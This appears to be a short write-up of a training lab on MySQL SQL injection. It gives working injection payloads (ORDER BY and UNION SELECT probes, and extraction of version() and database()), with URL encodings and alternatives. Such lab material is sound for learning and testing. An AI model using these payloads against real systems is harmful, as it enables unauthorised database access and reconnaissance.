# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
-- Lab: SQL Injection Attack
-- Querying Database Type & Version
-- DBMS: MySQL
-- 


-- 1. Determine number of columns using ORDER BY

' ORDER BY 2%23

-- Result:
-- 2 → Successful
-- Query contains 2 columns


-- 2. Confirm number of columns using UNION

' UNION SELECT NULL%2CNULL%23

-- Result:
-- NULL,NULL → Successful
-- 2 Columns


-- 3. Extract Database Version + Database Name

' UNION SELECT version(),database()%23

-- Result:
-- version()   → Database version
-- database()  → Current database name


-- =========================================================
-- URL Encoding
-- =========================================================

-- %2C → ,
-- %23 → #


-- =========================================================
-- Final Enumeration Flow
-- =========================================================

-- ORDER BY 2
--      ↓
-- Determine number of columns
--      ↓
-- UNION SELECT NULL,NULL
--      ↓
-- Confirm number of columns
--      ↓
-- UNION SELECT version(),database()
--      ↓
-- Extract DB version + database name


-- =========================================================
-- MySQL Alternatives
-- =========================================================

-- Database Version:
-- version()

-- Alternative:
-- @@version

-- Current Database:
-- database()

-- Comment:
-- #
-- or
-- %23 (URL encoded)
